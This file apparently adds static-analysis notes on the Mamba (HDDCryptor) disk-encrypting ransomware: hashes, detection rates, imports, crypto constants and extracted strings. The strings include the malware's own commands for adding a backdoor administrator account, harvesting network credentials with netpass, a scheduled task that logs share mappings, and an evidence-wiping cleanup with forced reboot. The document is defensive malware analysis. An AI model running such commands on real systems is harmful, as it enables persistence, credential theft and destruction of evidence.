@@ -1,0 +1,3437 @@
+:MAMBA:
+
+Analysis Platform: FLARE-VM
+
+MD5: 409d80bb94645fbc4a1fa61c07806883
+SHA256: 2ecc525177ed52c74ddaaacd47ad513450e85c01f2616bf179be5b576164bf63
+SHA512: a99a2f17d9fbb1da9fb993b976df63afa74317666eca46d1f04e7e6e24149547d1ac7210f673caeae9b23a900528ad6ad0a7b98780eff458d3d505029a06e9ba
+-- Used HashMyFiles
+
+Entropy: 6.36497
+Packed Status: Likely Unpacked
+-- Used DetectItEasy (DIE)
+
+File Type: PE32 executable (console) Intel 80386, for MS Windows -- Used Filetype
+Magic: 4D 5A (MZ) -- Used HxD
+
+Threat Intel:
+
+VirusTotal - 66/74
+MalwareBazaar - 17/23
+Metadefender - 5 yara rules matched
+Threat Names - Trojan.Ransom.HDDCryptor , exe.trojan.dcryptor, etc
+
+Imports: 
+	SHLWAPI.dll (2 functions - PathFileExistsW, PathFileExistsA)
+	USER32.dll (2 functions - ExitWindowsEx, ShowWindow)
+	KERNEL32.dll (93 functions)
+	ADVAPI32.dll (13 functions - RegisterServiceCtrlHandlerW, RevertToSelf, SetServiceStatus, ImpersonateLoggedOnUser, ChangeServiceConfig2W, LookupPrivilegeValueW, CreateProcessAsUserW, LogonUserW, StartServiceCtrlDispatcherW, OpenSCManagerW, OpenProcessToken, CreateServiceW, AdjustTokenPrivileges)
+	SHELL32.dll (2 functions - ShellExecuteW, ShellExecuteA)
+		 
+Identifiers: 
+	Signature: Microsoft Visual C++ v6.0 | Matches: 18
+	Signature: Microsoft Visual C++ 8    | Matches: 6
+	Signature: Microsoft Visual C++ 8	 | Matches: 2
+
+-- Used CFF Explorer
+		 
+Linker: Microsoft linker(11.00.61030)
+Compiler: Visual C/C++(17.36.61030)[LTCG/C++]
+Language: C/C++
+Tool: Microsoft Visual Studio(2012)
+ 
+Signature Names:
+	CRC-32-IEEE 802.3 poly 0x04C11DB7
+	Hash constant words K for SHA-384 and SHA-512
+	AES Rijndael S / ARIA S1
+	Rijndael Te0 (0xc66363a5U)
+	Rijndael Te1 (0xa5c66363U)
+	Rijndael Te2 (0x63a5c663U)
+	Rijndael Te3 (0x6363a5c6U)
+	Rijndael Td0 (0x51f4a750U)
+	Rijndael Td1 (0x5051f4a7U)
+	Rijndael Td2 (0xa75051f4U)
+	Rijndael Td3 (0xf4a75051U)
+	SSH RSA id-sha1 OBJ.ID. oiw(14) secsig(3) algorithms(2) 26
+	Windows CryptCreateHash
+	Windows CryptHashData
+	twofish q0
+	twofish q1
+	twofish poly_to_exp
+	twofish exp_to_poly
+	twofish calc_sb_tbl
+	rfc3548 Base 64 Encoding with URL and Filename Safe Alphabet
+	Twofish q
+	Twofish mds
+	Noekeon Nessie round
+	anti-debug: IsDebuggerPresent
+	anti-debug: anti-VMWare
+	unlzx table_three
+-- Used DetectItEasy (DIE)
+	
+Requested Priviledges: <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />
+
+Interesting Strings (-- Used Strings):
+	.rdata:41F748  permission denied
+	.rdata:41F75C  file exists
+	.rdata:41F768  no such device
+	.rdata:41F778  filename too long
+	.rdata:41F78C  device or resource busy
+	.rdata:41F7A4  io error
+	.rdata:41F7B0  directory not empty
+	.rdata:41F7C4  invalid argument
+	.rdata:41F7D8  no space on device
+	.rdata:41F7EC  no such file or directory
+	.rdata:41F808  function not supported
+	.rdata:41F820  no lock available
+	.rdata:41F834  not enough
+	.rdata:41F83E   memory
+	.rdata:41F848  resource unavailable try again
+	.rdata:41F868  cross device link
+	.rdata:41F87C  operation canceled
+	.rdata:41F890  too many files open
+	.rdata:41F8A4  permission_denied
+	.rdata:41F8B8  address_in_use
+	.rdata:41F8C8  address_not_available
+	.rdata:41F8E0  address_family_not_supported
+	.rdata:41F900  connection_already_in_progress
+	.rdata:41F920  bad_file_descriptor
+	.rdata:41F934  connection_aborted
+	.rdata:41F948  connection_refused
+	.rdata:41F95C  connection_reset
+	.rdata:41F970  destination_address_required
+	.rdata:41F990  bad_address
+	.rdata:41F99C  host_unreachable
+	.rdata:41F9B0  operation_in_progress
+	.rdata:41F9C8  interrupted
+	.rdata:41F9D4  invalid_argument
+	.rdata:41F9E8  already_connected
+	.rdata:41F9FC  too_many_files_open
+	.rdata:41FA10  message_size
+	.rdata:41FA20  filename_too_long
+	.rdata:41FA34  network_down
+	.rdata:41FA44  network_reset
+	.rdata:41FA54  network_unreachable
+	.rdata:41FA68  no_buffer_space
+	.rdata:41FA78  no_protocol_option
+	.rdata:41FA8C  not_connected
+	.rdata:41FA9C  not_a_socket
+	.rdata:41FAAC  operation_not_supported
+	.rdata:41FAC4  protocol_not_supported
+	.rdata:41FADC  wrong_protocol_type
+	.rdata:41FAF0  timed_out
+	.rdata:41FAFC  operation_would_block
+	.rdata:41FB14  address family not supported
+	.rdata:41FB34  address in use
+	.rdata:41FB44  address not available
+	.rdata:41FB5C  already connected
+	.rdata:41FB70  argument list too long
+	.rdata:41FB88  argument out of domain
+	.rdata:41FBA0  bad address
+	.rdata:41FBAC  bad file descriptor
+	.rdata:41FBC0  bad message
+	.rdata:41FBCC  broken pipe
+	.rdata:41FBD8  connection aborted
+	.rdata:41FBEC  connection already in progress
+	.rdata:41FC0C  connection refused
+	.rdata:41FC20  connection reset
+	.rdata:41FC34  destination address required
+	.rdata:41FC54  executable format error
+	.rdata:41FC6C  file too large
+	.rdata:41FC7C  host unreachable
+	.rdata:41FC90  identifier removed
+	.rdata:41FCA4  illegal byte sequence
+	.rdata:41FCBC  inappropriate io control operation
+	.rdata:41FCE0  invalid seek
+	.rdata:41FCF0  is a directory
+	.rdata:41FD00  message size
+	.rdata:41FD10  network down
+	.rdata:41FD20  network reset
+	.rdata:41FD30  network unreachable
+	.rdata:41FD44  no buffer space
+	.rdata:41FD54  no child process
+	.rdata:41FD68  no link
+	.rdata:41FD70  no message available
+	.rdata:41FD88  no message
+	.rdata:41FD94  no protocol option
+	.rdata:41FDA8  no stream resources
+	.rdata:41FDBC  no such device or address
+	.rdata:41FDD8  no such process
+	.rdata:41FDE8  not a directory
+	.rdata:41FDF8  not a socket
+	.rdata:41FE08  not a stream
+	.rdata:41FE18  not connected
+	.rdata:41FE28  not supported
+	.rdata:41FE38  operation in progress
+	.rdata:41FE50  operation not permitted
+	.rdata:41FE68  operation not supported
+	.rdata:41FE80  operation would block
+	.rdata:41FE98  owner dead
+	.rdata:41FEA4  protocol error
+	.rdata:41FEB4  protocol not supported
+	.rdata:41FECC  read only file system
+	.rdata:41FEE4  resource deadlock would occur
+	.rdata:41FF04  result out of range
+	.rdata:41FF18  state not recoverable
+	.rdata:41FF30  stream timeout
+	.rdata:41FF40  text file busy
+	.rdata:41FF50  timed out
+	.rdata:41FF5C  too many files open in system
+	.rdata:41FF7C  too many links
+	.rdata:41FF8C  too many symbolic link levels
+	.rdata:41FFAC  value too large
+	.rdata:41FFBC  wrong protocol type
+	.rdata:420080  bad allocation
+	.rdata:4201C4  0123456789abcdefghijklmnopqrstuvwxyz
+	.rdata:420214  0123456789abcdefghijklmnopqrstuvwxyz
+	.rdata:420264  0123456789abcdefABCDEF
+	.rdata:420334  Unknown exception
+	.rdata:420354  COMSPEC
+	.rdata:420360  cmd.exe
+	.rdata:420388  CorExitProcess
+	.rdata:4203C8  bad exception
+	.rdata:420980   !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+	.rdata:420B00   !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+	.rdata:420C00  FlsAlloc
+	.rdata:420C0C  FlsFree
+	.rdata:420C14  FlsGetValue
+	.rdata:420C20  FlsSetValue
+	.rdata:420C2C  InitializeCriticalSectionEx
+	.rdata:420C48  CreateSemaphoreExW
+	.rdata:420C5C  SetThreadStackGuarantee
+	.rdata:420C74  CreateThreadpoolTimer
+	.rdata:420C8C  SetThreadpoolTimer
+	.rdata:420CA0  WaitForThreadpoolTimerCallbacks
+	.rdata:420CC0  CloseThreadpoolTimer
+	.rdata:420CD8  CreateThreadpoolWait
+	.rdata:420CF0  SetThreadpoolWait
+	.rdata:420D04  CloseThreadpoolWait
+	.rdata:420D18  FlushProcessWriteBuffers
+	.rdata:420D34  FreeLibraryWhenCallbackReturns
+	.rdata:420D54  GetCurrentProcessorNumber
+	.rdata:420D70  GetLogicalProcessorInformation
+	.rdata:420D90  CreateSymbolicLinkW
+	.rdata:420DA4  SetDefaultDllDirectories
+	.rdata:420DC0  EnumSystemLocalesEx
+	.rdata:420DD4  CompareStringEx
+	.rdata:420DE4  GetDateFormatEx
+	.rdata:420DF4  GetLocaleInfoEx
+	.rdata:420E04  GetTimeFormatEx
+	.rdata:420E14  GetUserDefaultLocaleName
+	.rdata:420E30  IsValidLocaleName
+	.rdata:420E44  LCMapStringEx
+	.rdata:420E54  GetCurrentPackageId
+	.rdata:42397C  .cmd
+	.rdata:423984  .bat
+	.rdata:42398C  .exe
+	.rdata:423994  .com
+	.rdata:4239A0  PATH
+	.rdata:423B47   !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+	.rdata:423BD0  UTF-8
+	.rdata:423BD8  UTF-16LE
+	.rdata:423BE4  UNICODE
+	.rdata:423C40  Sunday
+	.rdata:423C48  Monday
+	.rdata:423C50  Tuesday
+	.rdata:423C58  Wednesday
+	.rdata:423C64  Thursday
+	.rdata:423C70  Friday
+	.rdata:423C78  Saturday
+	.rdata:423CB4  January
+	.rdata:423CBC  February
+	.rdata:423CC8  March
+	.rdata:423CD0  April
+	.rdata:423CD8  June
+	.rdata:423CE0  July
+	.rdata:423CE8  August
+	.rdata:423CF0  September
+	.rdata:423CFC  October
+	.rdata:423D04  November
+	.rdata:423D10  December
+	.rdata:423D24  MM/dd/yy
+	.rdata:423D30  dddd, MMMM dd, yyyy
+	.rdata:423D44  HH:mm:ss
+	.rdata:423F80  log10
+	.rdata:423F88  sinh
+	.rdata:423F90  cosh
+	.rdata:423F98  tanh
+	.rdata:423FA0  asin
+	.rdata:423FA8  acos
+	.rdata:423FB0  atan
+	.rdata:423FB8  atan2
+	.rdata:423FC0  sqrt
+	.rdata:423FD4  ceil
+	.rdata:423FDC  floor
+	.rdata:423FE4  fabs
+	.rdata:423FEC  modf
+	.rdata:423FF4  ldexp
+	.rdata:423FFC  _cabs
+	.rdata:424004  _hypot
+	.rdata:42400C  fmod
+	.rdata:424014  frexp
+	.rdata:424028  _logb
+	.rdata:424030  _nextafter
+	.rdata:42403C  (null)
+	.rdata:424079  ( 8PX
+	.rdata:424081  700WP
+	.rdata:424091  `h````
+	.rdata:424099  xpxxxx
+	.rdata:4240B4  e+000
+	.rdata:4240BC  SunMonTueWedThuFriSat
+	.rdata:4240D4  JanFebMarAprMayJunJulAugSepOctNovDec
+	.rdata:42418C  MessageBoxW
+	.rdata:424198  GetActiveWindow
+	.rdata:4241A8  GetLastActivePopup
+	.rdata:4241BC  GetUserObjectInformationW
+	.rdata:4241D8  GetProcessWindowStation
+	.rdata:4241F0  SystemRoot
+	.rdata:424388  __based(
+	.rdata:424394  __cdecl
+	.rdata:42439C  __pascal
+	.rdata:4243A8  __stdcall
+	.rdata:4243B4  __thiscall
+	.rdata:4243C0  __fastcall
+	.rdata:4243CC  __clrcall
+	.rdata:4243D8  __eabi
+	.rdata:4243E0  __ptr64
+	.rdata:4243E8  __restrict
+	.rdata:4243F4  __unaligned
+	.rdata:424400  restrict(
+	.rdata:42440C   new
+	.rdata:424414   delete
+	.rdata:424434  operator
+	.rdata:4244B0  `vftable'
+	.rdata:4244BC  `vbtable'
+	.rdata:4244C8  `vcall'
+	.rdata:4244D0  `typeof'
+	.rdata:4244DC  `local static guard'
+	.rdata:4244F4  `string'
+	.rdata:424500  `vbase destructor'
+	.rdata:424514  `vector deleting destructor'
+	.rdata:424534  `default constructor closure'
+	.rdata:424554  `scalar deleting destructor'
+	.rdata:424574  `vector constructor iterator'
+	.rdata:424594  `vector destructor iterator'
+	.rdata:4245B4  `vector vbase constructor iterator'
+	.rdata:4245D8  `virtual displacement map'
+	.rdata:4245F4  `eh vector constructor iterator'
+	.rdata:424618  `eh vector destructor iterator'
+	.rdata:424638  `eh vector vbase constructor iterator'
+	.rdata:424660  `copy constructor closure'
+	.rdata:42467C  `udt returning'
+	.rdata:424690  `RTTI
+	.rdata:424698  `local vftable'
+	.rdata:4246A8  `local vftable constructor closure'
+	.rdata:4246CC   new[]
+	.rdata:4246D4   delete[]
+	.rdata:4246E0  `omni callsig'
+	.rdata:4246F0  `placement delete closure'
+	.rdata:42470C  `placement delete[] closure'
+	.rdata:42472C  `managed vector constructor iterator'
+	.rdata:424754  `managed vector destructor iterator'
+	.rdata:42477C  `eh vector copy constructor iterator'
+	.rdata:4247A4  `eh vector vbase copy constructor iterator'
+	.rdata:4247D0  `dynamic initializer for '
+	.rdata:4247EC  `dynamic atexit destructor for '
+	.rdata:424810  `vector copy constructor iterator'
+	.rdata:424834  `vector vbase copy constructor iterator'
+	.rdata:424860  `managed vector copy constructor iterator'
+	.rdata:42488C  `local static thread guard'
+	.rdata:4248A8   Type Descriptor'
+	.rdata:4248BC   Base Class Descriptor at (
+	.rdata:4248D8   Base Class Array'
+	.rdata:4248EC   Class Hierarchy Descriptor'
+	.rdata:42490C   Complete Object Locator'
+	.rdata:4256D8  CreateFile2
+	.rdata:42570D  ('8PW
+	.rdata:425716  700PP
+	.rdata:425728  `h`hhh
+	.rdata:425731  xppwpp
+	.rdata:425754  1#SNAN
+	.rdata:42575C  1#IND
+	.rdata:425764  1#INF
+	.rdata:42576C  1#QNAN
+	.rdata:425774  bad locale name
+	.rdata:425788  generic
+	.rdata:425790  unknown error
+	.rdata:4257A0  iostream
+	.rdata:4257AC  iostream stream error
+	.rdata:4257C4  system
+	.rdata:4257CC  ios_base::badbit set
+	.rdata:4257E4  ios_base::failbit set
+	.rdata:4257FC  ios_base::eofbit set
+	.rdata:425818  C:\DC22\log_file.txt
+	.rdata:425838  error in CreateFile....
+	.rdata:425884  Wow64DisableWow64FsRedirection
+	.rdata:4258A4  Kernel32.dll
+	.rdata:4258B4  Checking resources existence. They are OK...
+	.rdata:4258E4  copy resource file...
+	.rdata:425AC0  driver installed before...
+	.rdata:425AF4  installing driver...
+	.rdata:425B28  installing driver successfully..
+	.rdata:425B4C  failed to copy file and exit..
+	.rdata:425B98  Password not set.exit
+	.rdata:425BC0  C:\DC22\netpass.txt
+	.rdata:425BD4  getting share drive information...
+	.rdata:425BF8  schtasks /create /tn DefragmentService /TR "cmd.exe /c net use >> c:\dc22\netuse.txt" /sc DAILY
+	.rdata:425C58  schtasks /run /TN DefragmentService
+	.rdata:425C7C  schtasks /delete /TN DefragmentService /F
+	.rdata:425CA8  C:\DC22\netpass.exe  /stab C:\DC22\netpass.txt
+	.rdata:425CD8  net user /add mythbusters 123456
+	.rdata:425CFC  net localgroup administrators mythbusters /add
+	.rdata:425D2C  cmd /c net use >> c:\dc22\netuse.txt
+	.rdata:425D78  Trying to create service...
+	.rdata:425DD4  creating service successfully. rebooting windows...
+	.rdata:425E08  starting serviceMain...
+	.rdata:425E20  ServiceMain: Entry
+	.rdata:425E34  ServiceMain: RegisterServiceCtrlHandler returned error
+	.rdata:425E6C  ServiceMain: SetServiceStatus returned error
+	.rdata:425E9C   ServiceMain: Performing Service Start Operations
+	.rdata:425ED0  ServiceMain: CreateEvent(g_ServiceStopEvent) returned error
+	.rdata:425F0C   ServiceMain: SetServiceStatus returned error
+	.rdata:425F3C  ServiceMain: Waiting for Worker Thread to complete
+	.rdata:425F70  ServiceMain: Worker Thread Stop Event signaled
+	.rdata:425FA0  ServiceMain: Performing Cleanup Operations
+	.rdata:425FCC  ServiceMain: Exit
+	.rdata:425FE0  ServiceCtrlHandler: Entry
+	.rdata:425FFC  ServiceCtrlHandler: SERVICE_CONTROL_STOP Request
+	.rdata:426030  ServiceCtrlHandler: SetServiceStatus returned error
+	.rdata:426064  ServiceCtrlHandler: Exit
+	.rdata:426080  ServiceWorkerThread: Entry
+	.rdata:42609C  Starting Mount app...
+	.rdata:4260B4  C:\DC22\Mount.exe
+	.rdata:4260C8  open
+	.rdata:4260F8  LogonUserW_FAILURE
+	.rdata:42610C  PXERR_IMPERSONATION_FAILURE
+	.rdata:426188  start hard drive encryption...
+	.rdata:426310  time limit passed.doing clean-up and reboot...
+	.rdata:426340  /C ping 1.1.1.1 -n 1 -w 3000 > Nul & sc delete DefragmentService & Del "
+	.rdata:426390   & taskkill /im Mount.exe & Del "C:\DC22\Mount.exe" & Del "C:\DC22\netpass.txt"  & Del "C:\DC22\netuse.txt"  & Del "C:\DC22\netpass.exe" & net user /del mythbusters
+	.rdata:426438   & shutdown /f /r /t 0
+	.rdata:426454  string too long
+	.rdata:426464  invalid string position
+	.rdata:42647C  bad cast
+	.rdata:4265A8  RSDS
+	.rdata:427E5E  PathFileExistsA
+	.rdata:427E70  PathFileExistsW
+	.rdata:427E80  SHLWAPI.dll
+	.rdata:427E8E  GetCommandLineW
+	.rdata:427EA0  GetNativeSystemInfo
+	.rdata:427EB6  FindResourceW
+	.rdata:427EC6  LoadResource
+	.rdata:427ED6  GetCurrentProcess
+	.rdata:427EEA  CreateDirectoryW
+	.rdata:427EFE  WaitForSingleObject
+	.rdata:427F14  SetEvent
+	.rdata:427F20  GetModuleHandleW
+	.rdata:427F34  WriteFile
+	.rdata:427F40  GetSystemDirectoryW
+	.rdata:427F56  Sleep
+	.rdata:427F5E  SizeofResource
+	.rdata:427F70  GetConsoleWindow
+	.rdata:427F84  GetVersionExW
+	.rdata:427F94  GetModuleFileNameW
+	.rdata:427FAA  CreateFileW
+	.rdata:427FB8  MultiByteToWideChar
+	.rdata:427FCE  GetLastError
+	.rdata:427FDE  GetProcAddress
+	.rdata:427FF0  LockResource
+	.rdata:428000  CreateEventW
+	.rdata:428010  GetModuleFileNameA
+	.rdata:428026  GetModuleHandleA
+	.rdata:42803A  CloseHandle
+	.rdata:428048  CreateThread
+	.rdata:428056  KERNEL32.dll
+	.rdata:428066  ShowWindow
+	.rdata:428074  ExitWindowsEx
+	.rdata:428082  USER32.dll
+	.rdata:428090  CreateServiceW
+	.rdata:4280A2  OpenProcessToken
+	.rdata:4280B6  OpenSCManagerW
+	.rdata:4280C8  StartServiceCtrlDispatcherW
+	.rdata:4280E6  LogonUserW
+	.rdata:4280F4  CreateProcessAsUserW
+	.rdata:42810C  LookupPrivilegeValueW
+	.rdata:428124  ChangeServiceConfig2W
+	.rdata:42813C  ImpersonateLoggedOnUser
+	.rdata:428156  SetServiceStatus
+	.rdata:42816A  RevertToSelf
+	.rdata:42817A  RegisterServiceCtrlHandlerW
+	.rdata:428198  AdjustTokenPrivileges
+	.rdata:4281AE  ADVAPI32.dll
+	.rdata:4281BE  ShellExecuteA
+	.rdata:4281CE  ShellExecuteW
+	.rdata:4281DC  SHELL32.dll
+	.rdata:4281EA  InterlockedIncrement
+	.rdata:428202  InterlockedDecrement
+	.rdata:42821A  EncodePointer
+	.rdata:42822A  DecodePointer
+	.rdata:42823A  EnterCriticalSection
+	.rdata:428252  LeaveCriticalSection
+	.rdata:42826A  DeleteCriticalSection
+	.rdata:428282  WideCharToMultiByte
+	.rdata:428298  GetStringTypeW
+	.rdata:4282AA  HeapFree
+	.rdata:4282B6  HeapAlloc
+	.rdata:4282C2  ExitProcess
+	.rdata:4282D0  GetModuleHandleExW
+	.rdata:4282E6  AreFileApisANSI
+	.rdata:4282F8  GetCommandLineA
+	.rdata:42830A  RaiseException
+	.rdata:42831C  RtlUnwind
+	.rdata:428328  InitializeCriticalSectionAndSpinCount
+	.rdata:428350  GetCPInfo
+	.rdata:42835C  IsProcessorFeaturePresent
+	.rdata:428378  UnhandledExceptionFilter
+	.rdata:428394  SetUnhandledExceptionFilter
+	.rdata:4283B2  SetLastError
+	.rdata:4283C2  TerminateProcess
+	.rdata:4283D6  TlsAlloc
+	.rdata:4283E2  TlsGetValue
+	.rdata:4283F0  TlsSetValue
+	.rdata:4283FE  TlsFree
+	.rdata:428408  GetStartupInfoW
+	.rdata:42841A  CompareStringW
+	.rdata:42842C  LCMapStringW
+	.rdata:42843C  GetLocaleInfoW
+	.rdata:42844E  IsValidLocale
+	.rdata:42845E  GetUserDefaultLCID
+	.rdata:428474  EnumSystemLocalesW
+	.rdata:42848A  IsDebuggerPresent
+	.rdata:42849E  GetStdHandle
+	.rdata:4284AE  GetFileType
+	.rdata:4284BC  GetProcessHeap
+	.rdata:4284CE  ReadFile
+	.rdata:4284DA  SetFileP
+	.rdata:4284E2  ointerEx
+	.rdata:4284EE  FlushFileBuffers
+	.rdata:428502  GetConsoleCP
+	.rdata:428512  GetConsoleMode
+	.rdata:428524  HeapSize
+	.rdata:428530  LoadLibraryExW
+	.rdata:428542  IsValidCodePage
+	.rdata:428554  GetACP
+	.rdata:42855E  GetOEMCP
+	.rdata:42856A  GetCurrentThreadId
+	.rdata:428580  QueryPerformanceCounter
+	.rdata:42859A  GetCurrentProcessId
+	.rdata:4285B0  GetSystemTimeAsFileTime
+	.rdata:4285CA  GetEnvironmentStringsW
+	.rdata:4285E4  FreeEnvironmentStringsW
+	.rdata:4285FE  SetFilePointer
+	.rdata:428610  HeapReAlloc
+	.rdata:42861E  OutputDebugStringW
+	.rdata:428634  LoadLibraryW
+	.rdata:428644  ReadConsoleW
+	.rdata:428654  SetStdHandle
+	.rdata:428664  WriteConsoleW
+	.rdata:428674  GetExitCodeProcess
+	.rdata:42868A  CreateProcessA
+	.rdata:42869C  GetFileAttributesExW
+	.rdata:4286B4  SetEnvironmentVariableA
+	.rdata:4286CE  SetEndOfFile
+	.data:429008  .?AV_Locimp@locale@std@@
+	.data:42902C  .?AVbad_alloc@std@@
+	.data:429048  .?AVlogic_error@std@@
+	.data:429068  .?AVlength_error@std@@
+	.data:429088  .?AVout_of_range@std@@
+	.data:4290B0  Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.
+	.data:4294E8  .?AVtype_info@@
+	.data:429628  .?AVbad_exception@std@@
+	.data:429830  sqrt
+	.data:429A1A                            
+	.data:429B01  abcdefghijklmnopqrstuvwxyz
+	.data:429B21  ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	.data:429C3A                            
+	.data:429D1A  abcdefghijklmnopqrstuvwxyz
+	.data:429D3A  ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	.data:42A4B2  kU'9
+	.data:42A502  HMXB
+	.data:42A567  ?Zd;
+	.data:42A5AF  ?/L[
+	.data:42A5BE  S;uD
+	.data:42A5DE  z?aUY
+	.data:42A5F6  D?$?
+	.data:42A60E  U>c{
+	.data:42A620  zc%C1
+	.data:42A64A  .:3q
+	.data:42A673  -64OS
+	.data:42A694  NKeb
+	.data:42A6B4  .?AVsystem_error@std@@
+	.data:42A6D4  .?AV?$codecvt@DDH@std@@
+	.data:42A6F4  .?AVbad_cast@std@@
+	.data:42A710  .?AVexception@std@@
+	.data:42A72C  .?AVcodecvt_base@std@@
+	.data:42A74C  .?AVios_base@std@@
+	.data:42A768  .?AV_Iostream_error_category@std@@
+	.data:42A794  .?AVfailure@ios_base@std@@
+	.data:42A7B8  .?AVruntime_error@std@@
+	.data:42A7D8  .?AV?$ctype@D@std@@
+	.data:42A7F4  .?AV_System_error_category@std@@
+	.data:42A820  .?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
+	.data:42A85C  .?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
+	.data:42A894  .?AV?$_Iosb@H@std@@
+	.data:42A8B4  .?AVerror_category@std@@
+	.data:42A8D8  .?AV_Generic_error_category@std@@
+	.data:42A904  .?AV_Facet_base@std@@
+	.data:42A924  .?AUctype_base@std@@
+	.data:42A944  .?AV?$basic_ofstream@DU?$char_traits@D@std@@@std@@
+	.data:42A980  .?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
+	.data:42A9BC  .?AVfacet@locale@std@@
+	.data:42A9DC  .?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
+
+	.rsrc:454930  RSDS
+	.rsrc:454948  dcrypt.pdb
+	.rsrc:454FEA  ExAllocatePoolWithTag
+	.rsrc:455002  ExFreePoolWithTag
+	.rsrc:455016  MmUnmapIoSpace
+	.rsrc:455028  MmMapIoSpace
+	.rsrc:455038  KeBugCheckEx
+	.rsrc:455048  _wcsicmp
+	.rsrc:455054  ExAcquireResourceExclusiveLite
+	.rsrc:455076  KeLeaveCriticalRegion
+	.rsrc:45508E  KeEnterCriticalRegion
+	.rsrc:4550A6  ExAcquireResourceSharedLite
+	.rsrc:4550C4  ExReleaseResourceLite
+	.rsrc:4550DC  ObfReferenceObject
+	.rsrc:4550F2  ObfDereferenceObject
+	.rsrc:45510A  ExInitializeResourceLite
+	.rsrc:455126  IoBuildDeviceIoControlRequest
+	.rsrc:455146  IoBuildSynchronousFsdRequest
+	.rsrc:455166  RtlInitUnicodeString
+	.rsrc:45517E  KeInitializeEvent
+	.rsrc:455192  ZwCreateFile
+	.rsrc:4551A2  KeWaitForSingleObject
+	.rsrc:4551BA  IofCallDriver
+	.rsrc:4551CA  IoAcquireRemoveLockEx
+	.rsrc:4551E2  KeQueryActiveProcessors
+	.rsrc:4551FC  IoRegisterDriverReinitialization
+	.rsrc:455220  IoDeleteDevice
+	.rsrc:455232  IoGetDeviceObjectPointer
+	.rsrc:45524E  ZwQueryValueKey
+	.rsrc:455260  PsTerminateSystemThread
+	.rsrc:45527A  PoStartNextPowerIrp
+	.rsrc:455290  ZwClose
+	.rsrc:45529A  PsGetVersion
+	.rsrc:4552AA  IoCreateSymbolicLink
+	.rsrc:4552C2  IoCreateDevice
+	.rsrc:4552D4  ZwOpenKey
+	.rsrc:4552E0  MmFreeContiguousMemory
+	.rsrc:4552FA  MmBuildMdlForNonPagedPool
+	.rsrc:455316  IoFreeMdl
+	.rsrc:455322  IoAllocateMdl
+	.rsrc:455332  MmAllocateContiguousMemory
+	.rsrc:455350  PsSetLoadImageNotifyRoutine
+	.rsrc:45536E  _wcsnicmp
+	.rsrc:45537A  KeBugCheck
+	.rsrc:455388  PoSetSystemState
+	.rsrc:45539C  KeSetEvent
+	.rsrc:4553AA  ExfInterlockedInsertTailList
+	.rsrc:4553CA  ExfInterlockedRemoveHeadList
+	.rsrc:4553EA  KeReleaseMutex
+	.rsrc:4553FC  KeClearEvent
+	.rsrc:45540C  ExInitializeNPagedLookasideList
+	.rsrc:45542E  InterlockedPopEntrySList
+	.rsrc:45544A  ZwWaitForSingleObject
+	.rsrc:455462  ExDeleteNPagedLookasideList
+	.rsrc:455480  InterlockedPushEntrySList
+	.rsrc:45549C  IoGetRequestorProcess
+	.rsrc:4554B4  IoReleaseRemoveLockEx
+	.rsrc:4554CC  MmMapLockedPagesSpecifyCache
+	.rsrc:4554EC  PsGetProcessId
+	.rsrc:4554FE  memmove
+	.rsrc:455508  _vsnwprintf
+	.rsrc:455516  ObReferenceObjectByHandle
+	.rsrc:455532  MmIsAddressValid
+	.rsrc:455546  KeSaveFloatingPointState
+	.rsrc:455562  ZwQuerySymbolicLinkObject
+	.rsrc:45557E  ZwOpenSymbolicLinkObject
+	.rsrc:45559A  IoVolumeDeviceToDosName
+	.rsrc:4555B4  KeDelayExecutionThread
+	.rsrc:4555CE  ObQueryNameString
+	.rsrc:4555E2  PsCreateSystemThread
+	.rsrc:4555FA  KeRestoreFloatingPointState
+	.rsrc:455618  ExQueueWorkItem
+	.rsrc:45562A  SeTokenIsAdmin
+	.rsrc:45563C  PsReferencePrimaryToken
+	.rsrc:455656  IoGetCurrentProcess
+	.rsrc:45566C  IofCompleteRequest
+	.rsrc:455682  PoCallDriver
+	.rsrc:455692  PsDereferencePrimaryToken
+	.rsrc:4556AE  MmUnmapLockedPages
+	.rsrc:4556C4  PsSetCreateProcessNotifyRoutine
+	.rsrc:4556E6  MmProbeAndLockPages
+	.rsrc:4556FC  IoAllocateIrp
+	.rsrc:45570C  MmUnlockPages
+	.rsrc:45571C  PsGetCurrentProcessId
+	.rsrc:455734  ZwFsControlFile
+	.rsrc:455746  IoGetLowerDeviceObject
+	.rsrc:455760  KeInitializeMutex
+	.rsrc:455774  IoAttachDeviceToDeviceStackSafe
+	.rsrc:455796  IoDetachDevice
+	.rsrc:4557A8  IoReleaseRemoveLockAndWaitEx
+	.rsrc:4557C8  IoGetAttachedDeviceReference
+	.rsrc:4557E8  IoInitializeRemoveLockEx
+	.rsrc:455804  wcsncmp
+	.rsrc:45580E  ExUuidCreate
+	.rsrc:45581E  IoGetStackLimits
+	.rsrc:455832  ExGetPreviousMode
+	.rsrc:455846  KeQueryInterruptTime
+	.rsrc:45585E  KeQuerySystemTime
+	.rsrc:455872  IoWriteOperationCount
+	.rsrc:45588A  MmQuerySystemSize
+	.rsrc:45589E  KeGetCurrentThread
+	.rsrc:4558B4  IoWriteTransferCount
+	.rsrc:4558CC  RtlRandom
+	.rsrc:4558D8  IoReadOperationCount
+	.rsrc:4558F0  IoGetInitialStack
+	.rsrc:455904  KeTickCount
+	.rsrc:455912  IoGetTopLevelIrp
+	.rsrc:455926  IoReadTransferCount
+	.rsrc:45593C  PsGetCurrentThreadId
+	.rsrc:455954  PsGetProcessExitTime
+	.rsrc:45596C  KeQueryPriorityThread
+	.rsrc:455984  IoReuseIrp
+	.rsrc:455992  IoBuildPartialMdl
+	.rsrc:4559A6  IoFreeIrp
+	.rsrc:4559B2  ZwSetInformationFile
